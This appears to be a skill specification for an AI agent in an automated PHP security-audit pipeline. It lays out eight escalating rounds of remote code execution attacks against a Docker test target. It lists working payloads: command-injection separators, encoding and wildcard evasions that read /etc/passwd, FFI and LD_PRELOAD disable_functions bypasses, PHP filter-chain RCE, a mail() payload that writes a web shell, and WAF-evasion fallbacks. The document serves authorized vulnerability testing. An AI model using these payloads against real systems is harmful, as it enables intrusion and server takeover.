> **Skill ID**: S-040-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-040-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against RCE (Remote Code Execution) sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 8 attack rounds — if stuck after round 6, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploit_results/{sink_id}_result.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify command execution by observing unique canary output (e.g., `echo UNIQUE_TOKEN`) — timing-only or blind detection requires secondary confirmation | FAIL — false positive on non-executing payloads |

## 8-Round Attack Strategy

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1: Basic Command Injection

Direct command separator concatenation:
- `;id`, `|id`, `` `id` ``, `$(id)`, `&& id`
- Applicable to: system, exec, passthru, shell_exec, popen
- For eval-type: `phpinfo();`, `system('id');`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2: Encoding Bypass

- URL encoding: `%3Bid` (;id)
- Double URL encoding: `%253Bid`
- Base64: `eval(base64_decode('c3lzdGVtKCdpZCcpOw=='))`
- Hex: `\x73\x79\x73\x74\x65\x6d`
- Unicode: `\u0073ystem`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3: Wildcard and Whitespace Bypass

- `$IFS` as space substitute: `cat$IFS/etc/passwd`
- `{cmd,arg}` syntax: `{ls,/tmp}`
- `?` and `*` wildcards: `/bin/ca? /etc/pas*`
- Tab `%09` as space substitute
- `$'\x20'` as space substitute

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4: Variable Overwrite Attack

- extract() overwrite critical variables: `_SERVER[REMOTE_ADDR]=127.0.0.1`
- parse_str() injection: `query=a&_SESSION[role]=admin`
- `$$var` variable overwrite: overwrite configuration variables, callback function names
- register_globals simulation scenario

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5: Truncation and Newline Injection

- `%00` null byte truncation (PHP < 5.3.4)
- `%0a` newline injection of new commands
- `%0d` carriage return injection
- Long string truncation: oversized input to overflow buffer
- Path truncation: `./../../` repeated to exceed MAX_PATH

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6: disable_functions Bypass

- LD_PRELOAD + mail()/putenv(): load malicious .so
- FFI (PHP 7.4+): `FFI::cdef("int system(const char *cmd);")->system("id")`
- imap_open() command injection
- ImageMagick delegate command injection
- PHP Bug exploitation (known CVEs)

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6.5: PHP Filter Chain RCE (Important New Technique 2022+)

Exploit `php://filter` chains to construct arbitrary characters and generate PHP code:
- Principle: Transform empty file content into arbitrary bytes through chained `convert.iconv` filters
- Applicable to: Any scenario where `include`/`require`/`file_get_contents` accepts the `php://` protocol
- Tool: `php_filter_chain_generator.py`
- Payload example:
  ```
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|convert.base64-decode/resource=php://temp
  ```
- Advantages: No file write required, no disable_functions bypass needed, pure protocol-layer RCE
- Conditions: `allow_url_include=On` or include path prefix is controllable

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6.6: PHP 8.x Feature Exploitation

- **FFI Advanced Exploitation** (PHP 7.4+):
  ```php
  $ffi = FFI::cdef("int system(const char *cmd);", "libc.so.6");
  $ffi->system("id");
  ```
  - Locate `ffi.enable` configuration (preload mode vs globally enabled)
  - Load malicious .h files via `FFI::load()`
- **Fiber Abuse** (PHP 8.1+):
  - Exception handling differences within Fibers may bypass certain security checks
- **Named Arguments Abuse** (PHP 8.0+):
  - `call_user_func(callback: 'system', ...$args)` bypass argument position checks
- **Attributes Reflection**:
  - `ReflectionAttribute::newInstance()` can trigger constructor

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6.7: Composer Autoloader Abuse

- Pollute `vendor/composer/autoload_classmap.php` or `autoload_psr4.php`
- Inject malicious files via `composer.json` `autoload.files`
- Phar deserialization via Composer cache directory
- `vendor/bin/` scripts direct execution

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6.8: mail() 5th Parameter Injection

- `mail($to, $subject, $body, $headers, $params)` — `$params` is passed to sendmail
- Payload: `-OQueueDirectory=/tmp -X/var/www/html/shell.php`
- Write email content to web directory for execution as PHP file
- Locate `mail.add_x_header` configuration

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7: Logic Bypass + Race Condition

- Business logic flow bypass: skip pre-validation steps
- Parameter type confusion: array replacing string `param[]=value`
- Race condition: concurrent requests bypass one-time checks
- Second-order execution: store payload first, then trigger execution

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8: Combined Attack

- Variable overwrite + command concatenation + encoding stacking
- Example: extract overwrites callback function name → Base64-encoded payload → wildcard blacklist bypass
- Chained exploitation: leverage low-severity vulnerabilities to gather information first, then construct RCE payload
- PHP Filter Chain + LFI: controllable include → Filter Chain generates PHP code → RCE
- SSRF → FFI: obtain FFI .h file via SSRF → FFI::load() → RCE
- Deserialization → Autoloader: triggers __autoload → loads malicious class → RCE
- File upload + LFI + race condition: upload temporary file → race condition include → RCE
- .env leaks APP_KEY → Laravel deserialization → RCE
- phpinfo() + LFI: phpinfo leaks temporary file path → include race condition → RCE

## Evidence Collection

After each successful attack round, confirm by executing detection commands:

```bash
# Write evidence file
# Payload contains: system('echo RCE_ROUND_N > /tmp/rce_proof_round_N')

# Verify evidence
docker exec php ls /tmp/rce_proof_*
docker exec php cat /tmp/rce_proof_round_N
```

Evidence criteria:
- `/tmp/rce_proof_*` file exists and content matches → **confirmed**
- Response contains command output (e.g., uid=33) → **confirmed**
- Only status code anomaly but no command execution evidence → **suspected**, continue to next round

## Per-Round Record Format

Each round MUST be fully recorded:

```json
{
  "round": 1,
  "strategy": "basic_cmd_injection",
  "payload": ";echo RCE_R1 > /tmp/rce_proof_round_1",
  "injection_point": "POST body param 'name'",
  "request": "POST /api/user/update HTTP/1.1\n...",
  "response_status": 200,
  "response_body_snippet": "first 500 chars...",
  "evidence_check": "docker exec php cat /tmp/rce_proof_round_1",
  "evidence_result": "file not found",
  "result": "failed",
  "failure_reason": "Parameter was filtered by escapeshellarg()"
}
```

## Smart Skip

Skip MAY be requested after round 4, but MUST provide:
- List of attempted strategies
- Analysis conclusions on filtering mechanisms
- Reasoning for why subsequent strategies cannot bypass the defenses

## Real-Time Sharing and Second-Order Tracking

### Shared Reading
Read the shared findings store before the attack phase begins, leveraging WAF bypass methods and leaked keys.

### Second-Order Tracking
Record user inputs written to DB/files in `$WORK_DIR/second_order/store_points.jsonl`.
Record locations where data retrieved from DB/files is passed into command execution in `$WORK_DIR/second_order/use_points.jsonl`.

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential RCE vulnerabilities:
- Pattern 1: `system($_GET['cmd'])` / `exec($userInput)` / `passthru($cmd)` — User input directly passed to command execution functions
- Pattern 2: `eval("return " . $input . ";")` / `assert($userInput)` — User input passed to code execution functions
- Pattern 3: `preg_replace('/' . $pattern . '/e', $replacement, $subject)` — `/e` modifier causes code execution
- Pattern 4: `$func = $_GET['func']; $func()` / `call_user_func($_POST['callback'])` — Dynamic function call, function name user-controllable
- Pattern 5: `extract($_POST)` / `parse_str($input)` — Variable overwrite may lead to callback function name tampering
- Pattern 6: `mail($to, $subject, $body, $headers, "-X/var/www/shell.php")` — mail() 5th parameter injection
- Pattern 7: `include($_GET['page'])` + `php://filter/convert.iconv...` — When LFI is controllable, escalate to RCE via Filter Chain

## Key Insight (Critical Judgment Criteria)

> **Key point**: The core of RCE auditing is tracing whether user input can reach "code execution" or "command execution" Sinks, with focus on dynamic function calls (`$func()`, `call_user_func`), variable overwrite (`extract`/`parse_str`), and disable_functions bypass paths (FFI, LD_PRELOAD, Filter Chain) — these three categories are the most common RCE entry points in modern PHP applications.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find missed filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for relevant findings from other experts
3. Decision tree matching: Select new attack directions based on failure patterns in `shared/pivot_strategy.md`
4. Terminate early when no new paths exist, avoiding wasted rounds that produce hallucinated results

## Prerequisites and Scoring (MUST Complete)

The output `exploits/{sink_id}.json` MUST contain the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for the route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict maximum is potential
- `other_preconditions` SHALL list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (see `shared/evidence_contract.md`):
- `EVID_CMD_EXEC_POINT` — Command execution function location ✅ REQUIRED
- `EVID_CMD_STRING_CONSTRUCTION` — Command string construction location ✅ REQUIRED
- `EVID_CMD_USER_PARAM_MAPPING` — User parameter to command fragment mapping ✅ REQUIRED
- `EVID_CMD_EXECUTION_RESPONSE` — Attack response evidence (REQUIRED when confirmed)

Missing required EVID → conclusion automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write. SQLite WAL mode automatically ensures concurrent safety.

## Output

Write all round results to `$WORK_DIR/exploits/{sink_id}.json`. Format MUST follow the attack result contract in `shared/data_contracts.md` (Section 9 exploit_result.json).



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "rce_system_001",
  "final_verdict": "confirmed",
  "rounds_executed": 3,
  "successful_round": 1,
  "payload": ";echo RCE_R1 > /tmp/rce_proof_round_1",
  "evidence_result": "RCE_R1",
  "severity": {
    "level": "C",
    "score": 2.85,
    "cvss": 9.5
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.85 → cvss 9.5 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "rce_system_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": ";id",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "H",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no proof of exploitation
- failure_reason is empty — no explanation of outcome
- severity_level 'H' without score — scoring fields are inconsistent

---

## Pre-Submission Self-Check (MUST Execute)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8), continue after all ✅
2. Execute the specialized checks below (S1-S3), submit after all ✅
3. Any item ❌ → Correct and re-check, MUST NOT skip

### Specialized Checks (RCE Auditor Specific)
- [ ] S1: Command execution functions (exec/system/passthru/shell_exec/popen) are precisely annotated
- [ ] S2: Complete call chain from user input to command concatenation is demonstrated
- [ ] S3: escapeshellarg/escapeshellcmd bypass methods are documented

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Sandbox/disable_functions blocks execution | Attempt bypass via `mail()`, `putenv()`/LD_PRELOAD, FFI, or `proc_open()`; if all blocked → record `"status": "sandbox_enforced"` |
| Command output not reflected in response | Switch to blind RCE detection (time-based, DNS, out-of-band file write); record detection method used |
| Payload blocked by WAF/filter | Log filter type, switch to obfuscated payload (`$(printf …)`, hex encoding); if all variants fail → record `"waf_blocked": true` |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
